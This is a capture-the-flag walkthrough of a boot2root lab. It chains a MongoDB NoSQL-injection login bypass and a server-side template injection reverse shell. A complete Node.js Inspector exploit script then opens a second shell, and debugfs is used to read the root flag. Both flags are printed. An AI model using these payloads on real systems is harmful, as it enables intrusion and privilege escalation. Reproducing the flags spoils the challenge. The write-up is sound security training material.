# Title: Do Not Disturb

#### Category: Boot2Root

#### Difficulty: Medium

#### Description: 
Sign's on the door. Room's active. You have access you were never given, and so does he. 

---

## Task 1: Hacker Holidays Storyline: Act 2 - Drift 

<img width="827" height="669" alt="image" src="https://github.com/user-attachments/assets/4db27624-ded8-4e6f-974c-3254938b1e29" />

<img width="834" height="520" alt="image" src="https://github.com/user-attachments/assets/419e5b5c-ade1-41d5-8907-d1873256156d" />

#### Analysis: 

The storyline suggests that the attacker has moved beyond exploiting individual vulnerabilities and is now operating with an active authenticated session. Instead of simply breaking into an application, they appear to have maintained persistence, hijacked privileged accounts, and are using trusted access to move through the environment unnoticed.

This indicates that the following challenge will involve investigating session handling, bypassing authentication, exploiting the web application, and escalating privileges to fully compromise the system.

---

## Task 2: Hacker Holidays: Day 7

<img width="570" height="676" alt="image" src="https://github.com/user-attachments/assets/e20bb8c9-0c89-4951-98ec-84d1c950391c" />

Analysis:

This challenge combines several web exploitation techniques with privilege escalation. The initial goal is to obtain staff access by exploiting the login mechanism. After gaining access, the application exposes a server-side code execution vulnerability that can be abused to obtain a shell on the machine. Finally, a misconfigured Node.js Inspector service allows privilege escalation into another service account, leading to the recovery of the root flag.

---

### Methodology

#### Part 1 — Access the Staff Portal
Access the target machine.
<img width="1909" height="701" alt="image" src="https://github.com/user-attachments/assets/2fa45c06-5b76-43cf-a5c3-8dadba96b880" />

Inspect the login page.

<img width="1904" height="729" alt="image" src="https://github.com/user-attachments/assets/5b4111fa-8224-4187-8848-9077ff363743" />

Notice that the username placeholder is Attendant. This serves as a useful clue that the application expects this account to exist

Open Burp Suite and use the embedded browser.

Use the following credentials:
> Username: attendant
> Password: x

The password can be anything because we are going to intercept and modify the request.

Enable Intercept.

<img width="1846" height="851" alt="image" src="https://github.com/user-attachments/assets/3ff57a06-f4b7-4891-9354-356c59cbf1f7" />

Replace the request body with:

``` username=attendant&password[$ne]= ```

This is a classic NoSQL Injection payload targeting MongoDB..

<img width="958" height="840" alt="image" src="https://github.com/user-attachments/assets/c2d54a64-487d-4ab1-8d2d-9b31abe69b85" />

Forward the request.

<img width="927" height="790" alt="image" src="https://github.com/user-attachments/assets/1f8dfd66-c14a-4dee-8811-772942cdffba" />

We now gain access to the Cabana Desk with staff privileges.


#### Part 2 — Gain Remote Code Execution

Inside the dashboard, there is a Preview textbox.
> Entering: 7*7
>
> returns: 49

The application is evaluating our input on the server instead of treating it as plain text. This indicates a Server-Side Template Injection (SSTI) vulnerability, meaning arbitrary JavaScript expressions can be executed.

<img width="921" height="791" alt="image" src="https://github.com/user-attachments/assets/bd1b28d4-1f28-4da5-9c55-b49e308a118b" />

Replace the input with the following payload:

This means we can used it to do some reverse shell payload (just correct me if I'm wrong with the terms)$16816
```
<% process.getBuiltinModule('child_process').exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/ATTACK_BOX_IP/4321 0>&1'"); %>
```

Start a Netcat listener:
``` nc -lvnp 4444 ```

Click Preview.

Forward the request in Burp Suite.

A reverse shell connects back to your listener.

<img width="1232" height="694" alt="image" src="https://github.com/user-attachments/assets/71701ca0-5a5b-4aaa-a170-13f437bb32a1" />

We now have command execution as the poolside user.

#### Part 3 — Retrieve the User Flag

Instead of manually searching every directory, use:
``` cat /*/*/user.txt ```

This attempts to print every user.txt located two directory levels below the root directory.

<img width="478" height="80" alt="image" src="https://github.com/user-attachments/assets/b5de61c1-176f-45c6-b364-f8cdaf9a5228" />


#### Part 4 — Privilege Escalation via Node.js Inspector

Start another listener:
> nc -lvnp 4445

Create the exploit script:
```
cat > /tmp/insp.js << 'EOF'
const http = require('http');
const net  = require('net');
const crypto = require('crypto');

const LHOST = process.argv[2];
const LPORT = process.argv[3];
const PHOST = '127.0.0.1', PPORT = 9229;

function getWsUrl() {
  return new Promise((resolve, reject) => {
    http.get(`http://${PHOST}:${PPORT}/json/list`, res => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => {
        try {
          const t = JSON.parse(d);
          const hit = (Array.isArray(t) ? t : [t]).find(x => x && x.webSocketDebuggerUrl);
          if (hit) return resolve(hit.webSocketDebuggerUrl);
          // fallback: /json/version
          http.get(`http://${PHOST}:${PPORT}/json/version`, r2 => {
            let d2 = '';
            r2.on('data', c => d2 += c);
            r2.on('end', () => resolve(JSON.parse(d2).webSocketDebuggerUrl));
          }).on('error', reject);
        } catch (e) { reject(e); }
      });
    }).on('error', reject);
  });
}

class WS {
  constructor(url) { this.url = url; this.buf = Buffer.alloc(0); this.pending = null; }
  connect() {
    return new Promise((resolve, reject) => {
      const u = new URL(this.url);
      const key = crypto.randomBytes(16).toString('base64');
      this.sock = net.connect(PPORT, PHOST, () => {
        this.sock.write([
          `GET ${u.pathname}${u.search} HTTP/1.1`,
          `Host: ${PHOST}:${PPORT}`,
          'Upgrade: websocket', 'Connection: Upgrade',
          `Sec-WebSocket-Key: ${key}`,
          'Sec-WebSocket-Version: 13', '', ''
        ].join('\r\n'));
      });
      let handshake = '', done = false;
      this.sock.on('data', chunk => {
        if (!done) {
          handshake += chunk.toString('utf8');
          const i = handshake.indexOf('\r\n\r\n');
          if (i === -1) return;
          done = true;
          this.buf = Buffer.from(handshake.slice(i + 4), 'utf8');
          this._drain();
          resolve();
        } else {
          this.buf = Buffer.concat([this.buf, chunk]);
          this._drain();
        }
      });
      this.sock.on('error', reject);
    });
  }
  _drain() {
    while (this.buf.length >= 2) {
      const op = this.buf[0] & 0x0f;
      let len = this.buf[1] & 0x7f, off = 2;
      if (len === 126) { len = this.buf.readUInt16BE(2); off = 4; }
      else if (len === 127) { len = Number(this.buf.readBigUInt64BE(2)); off = 10; }
      if (this.buf.length < off + len) return;
      const payload = this.buf.slice(off, off + len);
      this.buf = this.buf.slice(off + len);
      if (op === 1) {
        const msg = JSON.parse(payload.toString('utf8'));
        if (this.pending && this.pending.id === msg.id) { this.pending.resolve(msg); this.pending = null; }
      }
    }
  }
  send(obj) {
    const payload = Buffer.from(JSON.stringify(obj));
    const mask = crypto.randomBytes(4);
    const masked = Buffer.alloc(payload.length);
    for (let i = 0; i < payload.length; i++) masked[i] = payload[i] ^ mask[i % 4];
    let header;
    if (payload.length < 126)      { header = Buffer.alloc(6); header[0] = 0x81; header[1] = 0x80 | payload.length; mask.copy(header, 2); }
    else                            { header = Buffer.alloc(8); header[0] = 0x81; header[1] = 0x80 | 126; header.writeUInt16BE(payload.length, 2); mask.copy(header, 4); }
    this.sock.write(Buffer.concat([header, masked]));
    return new Promise(resolve => { this.pending = { id: obj.id, resolve }; });
  }
}

(async () => {
  const ws = new WS(await getWsUrl());
  await ws.connect();
  console.log('[+] connected to inspector');

  const idCheck = await ws.send({
    id: 1, method: 'Runtime.evaluate',
    params: { expression: "process.mainModule.require('child_process').execSync('id').toString()" }
  });
  console.log('[+] running as: ' + JSON.stringify(idCheck.result.result.value || idCheck.result));

  const expr = `(process.mainModule.require('child_process').spawn('/bin/bash',['-c','bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'],{detached:true,stdio:'ignore'}).unref(),'shell fired')`;
  await ws.send({ id: 2, method: 'Runtime.evaluate', params: { expression: expr } });
  console.log('[+] payload sent — check nc listener ' + LHOST + ':' + LPORT);
  setTimeout(() => process.exit(0), 2000);
})().catch(e => { console.error('[-] ' + e.message); process.exit(1); });
EOF
```
What does this script do?

The script abuses an exposed Node.js Inspector running locally on port 9229.

Its workflow is:

- Connect to the Node Inspector.
- Discover the active debugging session.
- Execute JavaScript inside the running Node.js process.
- Use the child_process module to launch another reverse shell.
- Connect back to our second Netcat listener.

Since the Node.js service runs with higher privileges than the current shell, this gives us access as the pipeline user.

Execute the script:
``` node /tmp/insp.js ATTACK_BOX_IP 4445 ```

<img width="1326" height="543" alt="image" src="https://github.com/user-attachments/assets/64ce759b-9b14-419a-82f9-c0b1314736a0" />

We now receive another shell running as pipeline.

#### Part 5 — Retrieve the Root Flag

Since the pipeline user has permission to access the filesystem using debugfs, we can inspect the root directory without switching users.

First, list the contents of /root:
``` debugfs -R "ls -l /root" /dev/nvme0n1p1 ```

<img width="656" height="308" alt="image" src="https://github.com/user-attachments/assets/10c364d2-d04e-447d-81cd-86506856ca86" />

After confirming the location of root.txt, read it directly:
``` debugfs -R "cat  /root/root.txt" /dev/nvme0n1p1 ```

<img width="654" height="117" alt="image" src="https://github.com/user-attachments/assets/3e0d3b99-88bd-4f14-8fe4-5868ffdbbdd4" />

---

### Today's Itinerary

1. Find the user flag
> Locate and read the user.txt file from the compromised system.

2. Find the root flag 
> Use debugfs to read /root/root.txt and recover the final flag.


---

### Flag

User Flag: THM{w4rm_s3ss10n_h1j4ck3d}

Root Flag: THM{r4w_d1sk_4cc3ss_w4s_t00_much}

This challenge demonstrated how multiple vulnerabilities can be chained together to achieve full system compromise. The attack began with a NoSQL Injection that bypassed authentication, followed by a Server-Side Template Injection (SSTI) that provided remote code execution. From the initial shell, an exposed Node.js Inspector service was abused to execute JavaScript within a higher-privileged process, resulting in privilege escalation. Finally, the pipeline user's access to debugfs allowed direct reading of the root filesystem, leading to the recovery of the root flag. Overall, the challenge highlights how seemingly unrelated misconfigurations can combine into a complete attack path from initial access to full system compromise.
